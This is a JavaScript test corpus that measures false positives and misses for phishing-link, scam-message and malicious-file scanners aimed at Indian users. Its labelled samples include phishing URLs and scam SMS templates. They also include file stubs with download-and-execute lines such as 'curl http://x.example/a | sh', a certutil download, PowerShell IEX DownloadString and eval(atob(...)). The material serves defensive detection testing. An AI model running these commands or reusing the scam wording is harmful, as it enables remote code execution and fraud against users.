// security/corpus.js — labelled test corpus + evaluation of the scanners.
//
// Purpose: "measure false positives / false negatives" instead of guessing. Everything here is
// SYNTHETIC and harmless: link strings are only analysed offline (no network, nothing is opened),
// file samples are tiny hand-built byte strings that merely LOOK like risky files (no real
// malware anywhere). The corpus is small, so the numbers are an indicator, not a certification —
// grow it with your own real examples (false alarms and misses you meet) over time.
const { analyzeUrl } = require('./linkscan');
const { analyzeText } = require('./textscan');
const { analyzeFile } = require('./filescan');

// ---- harmless zip builder (stored entries) ----
function zip(files, flags) {
  const parts = [], cd = []; let off = 0;
  for (const [n, c] of files) {
    const nb = Buffer.from(n), data = Buffer.from(c);
    const h = Buffer.alloc(30); h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(20, 4); h.writeUInt16LE(flags || 0, 6); h.writeUInt32LE(data.length, 18); h.writeUInt32LE(data.length, 22); h.writeUInt16LE(nb.length, 26);
    parts.push(h, nb, data);
    const c2 = Buffer.alloc(46); c2.writeUInt32LE(0x02014b50, 0); c2.writeUInt16LE(20, 4); c2.writeUInt16LE(20, 6); c2.writeUInt16LE(flags || 0, 8); c2.writeUInt32LE(data.length, 20); c2.writeUInt32LE(data.length, 24); c2.writeUInt16LE(nb.length, 28); c2.writeUInt32LE(off, 42);
    cd.push(c2, nb); off += 30 + nb.length + data.length;
  }
  const cdb = Buffer.concat(cd), e = Buffer.alloc(22);
  e.writeUInt32LE(0x06054b50, 0); e.writeUInt16LE(files.length, 8); e.writeUInt16LE(files.length, 10); e.writeUInt32LE(cdb.length, 12); e.writeUInt32LE(off, 16);
  return Buffer.concat([...parts, cdb, e]);
}
const MZ = () => Buffer.concat([Buffer.from('MZ'), Buffer.alloc(200)]);
const apk = (perms, extra) => zip([['AndroidManifest.xml', '<manifest> ' + perms.map((p) => 'android.permission.' + p).join(' ')], ['classes.dex', 'dex\n035'], ...(extra || [])]);

const URLS = [
  // ---- benign (0) ----
  ['https://www.google.com/search?q=weather', 0], ['https://github.com/pavan/repo', 0], ['https://www.amazon.in/dp/B0C1234567', 0], ['https://paytm.com/recharge', 0],
  ['https://www.flipkart.com/offers-store', 0], ['https://www.wikipedia.org/', 0], ['https://www.irctc.co.in/nget/train-search', 0], ['https://netbanking.hdfcbank.com/netbanking/', 0],
  ['https://www.onlinesbi.sbi/', 0], ['https://www.instagram.com/p/Cabc123/', 0], ['https://stackoverflow.com/questions/1234', 0], ['https://docs.python.org/3/library/os.html', 0],
  ['https://www.youtube.com/watch?v=dQw4w9WgXcQ', 0], ['https://web.whatsapp.com/', 0], ['https://accounts.google.com/signin', 0], ['https://login.microsoftonline.com/common/oauth2', 0],
  ['https://aureone.onrender.com/health', 0], ['https://www.apple.com/in/', 0], ['https://support.google.com/accounts/answer/32050', 0], ['https://www.npmjs.com/package/express', 0],
  ['https://render.com/docs/free', 0], ['https://www.bbc.com/news', 0], ['https://t.me/durov', 0], ['https://bit.ly/3abcXYZ', 0], ['https://www.netflix.com/in/', 0],
  ['https://www.phonepe.com/', 0], ['https://www.icicibank.com/personal-banking/cards', 0], ['https://pay.google.com/about/', 0], ['https://www.microsoft.com/en-in/windows', 0], ['https://mail.google.com/mail/u/0/#inbox', 0],
  // ---- scam / phishing / malware (1) ----
  ['paytm-kyc-update.xyz/login?otp=1', 1], ['http://185.220.101.5/verify/sbi.apk', 1], ['https://paytrn.com/pay', 1], ['https://secure-hdfc.bank-login.top/signin', 1], ['https://xn--pypal-4ve.com/', 1],
  ['https://google.com.account-verify.click/', 1], ['http://sbi-kyc-verify.in.net/update', 1], ['https://amaz0n-offer.top/claim-prize', 1], ['https://www.flipkart-bigbilliondays.xyz/win', 1],
  ['https://free-recharge-jio.cf/get', 1], ['https://netflix-account-suspended.link/update-billing', 1], ['https://whatsapp-gold-download.com/whatsapp.apk', 1], ['http://203.0.113.9:8080/login.php', 1],
  ['https://hdfcbank.com.secure-login.ml/netbanking', 1], ['https://upi-refund-claim.vip/collect', 1], ['https://icici-bank-kyc.work/verify', 1], ['https://income-tax-refund-gov.info/claim', 1],
  ['https://electricity-bill-update-now.xyz/pay', 1], ['https://claim-your-prize.icu/lottery-winner', 1], ['https://paypal.com-security-update.top/login', 1], ['https://apple-id-locked.support/unlock', 1],
  ['https://sbi.co.in@evil-site.xyz/login', 1], ['https://my-dream11-free-cash.cam/bonus.apk', 1], ['https://kbc-lottery-winner.club/claim', 1], ['https://binance-airdrop-claim.xyz/wallet', 1], ['https://login-microsoft365.top/verify', 1],
];

const TEXTS = [
  // ---- benign (0) ----
  ['Your OTP for login is 482910. Do not share it with anyone. -Paytm', 0], ['Hi bro, kal 5 baje cafe pe milte hain', 0], ['Dear customer, Rs 1,200 debited from A/c XX1234 on 12-10. If not you, call 1800 xxx. -SBI', 0],
  ['Your Amazon order #123 has been shipped and will arrive tomorrow', 0], ['Mom: bijli ka bill bhar diya maine, tension mat lo', 0], ['Meeting at 4pm, please share the report with the team', 0],
  ['Your electricity bill of Rs 840 is generated. Pay by 20th through the official app.', 0], ['Happy birthday! Party at my place tonight', 0], ['KYC verification successful. Thank you for banking with us.', 0],
  ['Your account statement for September is ready. Login to the official app to view it.', 0], ['Please install the update from the Play Store when you get time', 0], ['Your OTP is 123456. Never share it with anyone, including bank staff.', 0],
  ['Reminder: your appointment is tomorrow at 10am. Reply YES to confirm.', 0], ['Aapka recharge successful hua. Validity 28 din.', 0], ['Your refund of Rs 499 has been credited to your original payment method.', 0],
  ['Team, urgent: staging server is down, please check immediately', 0], ["Don't tell anyone about the surprise party for dad!", 0], ['Bhai kal ghar aa jao, khana saath khayenge', 0], ['The police station is near the market, I will meet you there', 0],
  ['Congratulations on your new job! Party kab de raha hai?', 0], ['Paytm: Rs 200 sent to Ramesh. Balance Rs 3,400. Never share your UPI PIN.', 0], ['Hey, can you send me the invoice by tonight?', 0],
  // ---- scam (1) ----
  ['Dear customer your SBI account will be blocked today. Update KYC now http://sbi-kyc-update.xyz/login and share OTP', 1], ['Aapka parcel customs mein pakda gaya hai, CBI arrest karegi, abhi 25000 bhejo kisi ko mat batana', 1],
  ['Congratulations! You have won Rs 25,00,000 in KBC lottery. Call +92xxxx to claim your prize', 1], ['Work from home, earn Rs 5000 daily, just like YouTube videos. Join Telegram group', 1],
  ['Your electricity connection will be disconnected tonight 9:30pm. Pay bill immediately: http://bijli-pay-now.top/x', 1], ['Request money Rs 1 to verify your UPI id and receive cashback of Rs 5000', 1],
  ['Install AnyDesk and tell me the 9 digit code so I can fix your refund', 1], ['Your PAN card is blocked. Update PAN immediately: bit.ly/pan-update-now', 1],
  ['Invest in crypto with our VIP trading group, guaranteed 3x return in 7 days', 1], ['Bhai OTP bata de jaldi, galti se mere number pe aa gaya', 1],
  ['Download this apk to claim your electricity bill discount: http://x.test/app.apk', 1], ['Sir your Aadhaar will expire today, update now or account will be frozen', 1],
  ['Final notice: Customs duty pending on your courier, pay Rs 4999 now to avoid police case', 1], ['Dear user, your card ending 4455 is blocked. Click link to unblock: https://hdfc-card-unblock.xyz/verify', 1],
  ['Task job: like and subscribe videos and earn 100 per task, daily income guaranteed', 1], ['Aapko Digital arrest kiya ja raha hai, CBI officer se baat karo, kisi ko mat batana, abhi video call par aao', 1],
  ['Congrats! You are selected for Amazon part-time job. Earn 3000 daily. Message on WhatsApp', 1], ['Your SIM will be deactivated in 24 hours. Complete KYC at once: http://jio-kyc-update.cc/sim', 1],
  ['Send your UPI PIN to receive the refund of 1999', 1], ['Share your OTP to receive prize money, lottery winner', 1],
];

const FILES = [
  // ---- benign (0) ----
  ['holiday.jpg', () => Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(800, 7)]), 0], ['logo.png', () => Buffer.concat([Buffer.from([0x89]), Buffer.from('PNG\r\n'), Buffer.alloc(500, 3)]), 0],
  ['notes.txt', () => Buffer.from('Shopping list:\nmilk\nbread\neggs\n'), 0], ['report.pdf', () => Buffer.from('%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n/URI (https://example.com)\n%%EOF'), 0],
  ['data.json', () => Buffer.from('{"a":1,"b":[1,2,3]}'), 0], ['page.html', () => Buffer.from('<html><body><h1>Hello</h1><script>console.log(1)</script></body></html>'), 0],
  ['backup.zip', () => zip([['a.txt', 'hello'], ['b.csv', '1,2,3']]), 0], ['letter.docx', () => zip([['[Content_Types].xml', 'x'], ['word/document.xml', '<w:p/>']]), 0],
  ['hello.py', () => Buffer.from('print("hello")\nfor i in range(3):\n    print(i)\n'), 0], ['camera.apk', () => apk(['INTERNET', 'CAMERA']), 0],
  ['chat.apk', () => apk(['INTERNET', 'CAMERA', 'RECORD_AUDIO', 'READ_CONTACTS']), 0], ['song.mp3', () => Buffer.concat([Buffer.from('ID3'), Buffer.alloc(600, 9)]), 0],
  // ---- malicious-looking (1) ----
  ['invoice.pdf.exe', () => MZ(), 1], ['photo.jpg', () => MZ(), 1], ['KYC_Update.apk', () => apk(['INTERNET', 'READ_SMS', 'RECEIVE_SMS', 'BIND_ACCESSIBILITY_SERVICE', 'SYSTEM_ALERT_WINDOW']), 1],
  ['salary.docm', () => zip([['[Content_Types].xml', 'x'], ['word/document.xml', 'x'], ['word/vbaProject.bin', 'x']]), 1], ['offer.pdf', () => Buffer.from('%PDF-1.4 /OpenAction << /S /JavaScript /JS (app.alert(1)) >> /Launch'), 1],
  ['update.ps1', () => Buffer.from('powershell -enc AAAA; IEX (New-Object Net.WebClient).DownloadString("x")'), 1], ['setup.zip', () => zip([['readme.txt', 'x'], ['installer.exe', 'MZ']]), 1],
  ['secret.zip', () => zip([['a.txt', 'x']], 1), 1], ['page.js', () => Buffer.from('eval(atob("ZG9jdW1lbnQ="));'), 1], ['install.sh', () => Buffer.from('#!/bin/sh\ncurl http://x.example/a | sh\nchmod +x /tmp/a && /tmp/a\n'), 1],
  ['wallpaper.png', () => Buffer.concat([Buffer.from([0x7f]), Buffer.from('ELF'), Buffer.alloc(100)]), 1], ['photo\u202Egpj.exe', () => MZ(), 1],
  ['dropper.apk', () => apk(['INTERNET', 'REQUEST_INSTALL_PACKAGES', 'RECEIVE_SMS'], [['assets/payload.apk', 'PK']]), 1], ['shortcut.lnk', () => Buffer.concat([Buffer.from([0x4c, 0, 0, 0]), Buffer.alloc(100)]), 1],
];


// ---------------------------------------------------------------------------------------------
// HELD-OUT set: written AFTER the rules above were tuned, never used for tuning. Its first-run
// result is the honest number (see HOLDOUT_FIRST_RUN below); the tuning set above is optimistic.
const OLE = () => Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.from('Root Entry VBA Macros _VBA_PROJECT'), Buffer.alloc(200)]);
const H_URLS = [
  ['https://www.hotstar.com/in', 0], ['https://www.swiggy.com/restaurants', 0], ['https://zerodha.com/open-account', 0], ['https://www.linkedin.com/in/someone', 0], ['https://medium.com/@user/post', 0],
  ['https://www.reddit.com/r/india/', 0], ['https://www.nseindia.com/market-data', 0], ['https://www.cricbuzz.com/live-cricket-scores', 0], ['https://www.myntra.com/shoes', 0], ['https://developer.android.com/studio', 0],
  ['https://en.wikipedia.org/wiki/Phishing', 0], ['https://www.canva.com/login', 0], ['https://meet.google.com/abc-defg-hij', 0], ['https://www.paypal.com/signin', 0], ['https://www.uidai.gov.in/en/', 0],
  ['https://www.incometax.gov.in/iec/foportal/', 0], ['https://www.airtel.in/recharge', 0], ['https://zoom.us/j/123456789', 0], ['https://drive.google.com/file/d/1abc/view', 0], ['https://www.jio.com/selfcare/login', 0],
  ['http://paytm-cashback-offer.xyz/claim', 1], ['https://sbi-netbanking-secure.top/login', 1], ['https://amazon-prime-free-gift.click/win', 1], ['https://www.hdfc-kyc-expire.cc/update', 1], ['http://phonepe-reward-points.work/redeem', 1],
  ['https://flipkart.sale-offer-today.vip/buy', 1], ['https://gpay-refund-claim.link/verify', 1], ['https://jio-free-recharge-2025.buzz/get', 1], ['https://instagram-verify-badge.top/apply', 1], ['https://whatsapp-web-login.icu/scan', 1],
  ['https://netflix-free-premium.cf/login', 1], ['https://amaz0n.in.secure-pay.xyz/checkout', 1], ['http://45.33.32.156/admin/login.php', 1], ['https://google-drive-share-doc.top/view', 1], ['https://electricity-board-bill-pay.cam/now', 1],
  ['https://telegram-premium-free.click/apk/telegram.apk', 1], ['https://pm-kisan-yojana-apply.xyz/register', 1], ['https://aadhaar-kyc-update-now.top/verify', 1], ['https://yono-sbi-reward.in.net/redeem', 1], ['https://bitly.com.free-gift.top/x', 1],
];
const H_TEXTS = [
  ['Your Swiggy order is on the way. Delivery partner: Ravi. Do not share OTP with anyone.', 0], ['Bhai kal exam hai, notes bhej dena', 0], ['OTP 556677 is valid for 10 minutes. Do not share with anyone. -HDFC Bank', 0],
  ['Your cab is arriving in 3 mins. Driver: Amit, OTP: 4321', 0], ['Salary Rs 45,000 credited to A/c XX5566', 0], ['Reminder: electricity bill due on 25th. Pay on the official website or app.', 0],
  ['Train PNR 1234567890 confirmed. Happy journey!', 0], ['Mummy ne bola ki aaj raat ko jaldi aana', 0], ['Your Aadhaar download request is successful. Visit uidai.gov.in', 0],
  ['Please verify the attached report and share your feedback', 0], ['Congrats on the promotion! Treat de de yaar', 0], ['Police verification certificate ready for pickup', 0],
  ['Customs clearance done, your parcel will be delivered tomorrow', 0], ['Free webinar on cloud security tomorrow 5pm. Register on our official site', 0], ['Aaj ka match dekha? Kohli ne kya shot mara!', 0],
  ['Dear customer, your electricity will be cut tonight. Call 98xxxx immediately to avoid disconnection and pay bill via link', 1], ['Aapka bank account band ho jayega, abhi KYC update karein varna block', 1],
  ['Earn Rs 800 per day by liking posts, join our Telegram channel now', 1], ['You are a lucky winner of Rs 10 lakh, send Rs 500 processing fee', 1],
  ['Mai CBI officer bol raha hu, aapke naam par drugs ka parcel pakda gaya hai, video call par aaiye', 1], ['Click here to claim your free recharge: http://jio-offer-free.xyz/x', 1],
  ['Install QuickSupport app so our agent can help refund your money', 1], ['Your account is suspended, verify immediately at https://sbi-secure-login.top/verify, share OTP', 1],
  ['Guaranteed double your money in 10 days, join our crypto VIP signals group', 1], ['Send me OTP quickly, it came on your number by mistake', 1],
  ['Your parcel is held at customs, pay Rs 3200 clearance fee to avoid arrest', 1], ['Sir aapke Aadhaar se SIM fraud hua hai, police case ho jayega, turant call karein kisi ko mat batana', 1],
  ['Get Rs 5000 cashback: request money Re 1 to verify UPI', 1], ['Work from home: complete simple tasks, earn Rs 2000 daily income, WhatsApp us', 1], ['Dear user your PAN is blocked, update PAN card details now: bit.ly/pan-fix', 1],
];
const H_FILES = [
  ['resume.pdf', () => Buffer.from('%PDF-1.7\n1 0 obj << /Type /Page >> endobj\n%%EOF'), 0], ['photo.jpeg', () => Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xdb]), Buffer.alloc(600, 5)]), 0],
  ['budget.xlsx', () => zip([['[Content_Types].xml', 'x'], ['xl/workbook.xml', '<wb/>']]), 0], ['slides.pptx', () => zip([['[Content_Types].xml', 'x'], ['ppt/presentation.xml', '<p/>']]), 0],
  ['readme.md', () => Buffer.from('# Project\nSome notes about setup.\n'), 0], ['config.yaml', () => Buffer.from('name: test\nport: 8080\n'), 0], ['video.mp4', () => Buffer.concat([Buffer.from([0, 0, 0, 0x20]), Buffer.from('ftypmp42'), Buffer.alloc(500, 1)]), 0],
  ['archive.tar.gz', () => Buffer.concat([Buffer.from([0x1f, 0x8b, 8, 0]), Buffer.alloc(500, 2)]), 0], ['script.py', () => Buffer.from('import os\nprint(os.getcwd())\n'), 0], ['calculator.apk', () => apk(['INTERNET']), 0],
  ['resume.pdf.scr', () => MZ(), 1], ['KYC.pdf.apk', () => apk(['INTERNET', 'READ_SMS', 'SYSTEM_ALERT_WINDOW']), 1], ['invoice.xls', () => OLE(), 1], ['update.bat', () => Buffer.from('@echo off\npowershell -enc SQBFAFgA\ncertutil -urlcache -f http://x.example/a.exe a.exe\n'), 1],
  ['document.pdf', () => Buffer.from('%PDF-1.4 /OpenAction << /S /Launch /F (cmd.exe) >>'), 1], ['photo.png', () => Buffer.concat([Buffer.from([0x7f]), Buffer.from('ELF'), Buffer.alloc(80)]), 1],
  ['stealer.apk', () => apk(['INTERNET', 'READ_SMS', 'READ_CALL_LOG', 'READ_CONTACTS', 'BIND_NOTIFICATION_LISTENER_SERVICE']), 1], ['setup.zip', () => zip([['readme.txt', 'x'], ['payload.exe', 'MZ'], ['run.js', 'x']]), 1],
  ['click.hta', () => Buffer.from('<html><script>var s=new ActiveXObject("WScript.Shell");s.Run("cmd /c calc");eval(atob("YQ=="))</script></html>'), 1], ['loader.js', () => Buffer.from('var x = atob("aGVsbG8="); eval(atob("YWxlcnQoMSk="));'), 1],
];
// result of the very first run on this held-out set (before any change made because of it):
const HOLDOUT_FIRST_RUN = 'links 100%/100% (precision/recall), files 100%/100%, messages precision 92.9% recall 86.7% (1 false alarm: "Customs clearance done...", 2 misses: electricity-cut wording, "Send me OTP"). Rules were then fixed, so this set is now tuned too — the next honest check needs NEW samples.';

function metrics(rows) {
  let tp = 0, fp = 0, tn = 0, fn = 0; const misses = [];
  for (const r of rows) {
    const flagged = r.verdict !== 'LOW RISK';
    if (flagged && r.label) tp++; else if (flagged && !r.label) { fp++; misses.push({ item: r.item, kind: 'false positive', score: r.score, verdict: r.verdict }); }
    else if (!flagged && !r.label) tn++; else { fn++; misses.push({ item: r.item, kind: 'missed', score: r.score, verdict: r.verdict }); }
  }
  const prec = tp + fp ? tp / (tp + fp) : 1, rec = tp + fn ? tp / (tp + fn) : 1;
  return { total: rows.length, tp, fp, tn, fn, precision: +(prec * 100).toFixed(1), recall: +(rec * 100).toFixed(1), fpr: +((fp / Math.max(1, fp + tn)) * 100).toFixed(1), accuracy: +(((tp + tn) / rows.length) * 100).toFixed(1), misses };
}

async function evaluate() {
  const out = {};
  const u = []; for (const [item, label] of URLS) { const r = await analyzeUrl(item, { offline: true }); u.push({ item, label, verdict: r.verdict, score: r.score }); } out.links = metrics(u);
  const t = []; for (const [item, label] of TEXTS) { const r = await analyzeText(item, { offline: true, noAI: true }); t.push({ item: item.slice(0, 70), label, verdict: r.verdict, score: r.score }); } out.messages = metrics(t);
  const f = []; for (const [name, mk, label] of FILES) { const r = analyzeFile(mk(), name); f.push({ item: name, label, verdict: r.verdict, score: r.score }); } out.files = metrics(f);
  const hu = []; for (const [item, label] of H_URLS) { const r = await analyzeUrl(item, { offline: true }); hu.push({ item, label, verdict: r.verdict, score: r.score }); }
  const ht = []; for (const [item, label] of H_TEXTS) { const r = await analyzeText(item, { offline: true, noAI: true }); ht.push({ item: item.slice(0, 70), label, verdict: r.verdict, score: r.score }); }
  const hf = []; for (const [name, mk, label] of H_FILES) { const r = analyzeFile(mk(), name); hf.push({ item: name, label, verdict: r.verdict, score: r.score }); }
  out.holdout = { links: metrics(hu), messages: metrics(ht), files: metrics(hf), firstRun: HOLDOUT_FIRST_RUN };
  out.note = 'Synthetic, offline corpus (' + (u.length + t.length + f.length) + ' samples). Indicator only — not a certification. Add your own real false alarms / misses to corpus.js.';
  out.at = new Date().toISOString();
  return out;
}
module.exports = { evaluate, URLS, TEXTS, FILES, zip };
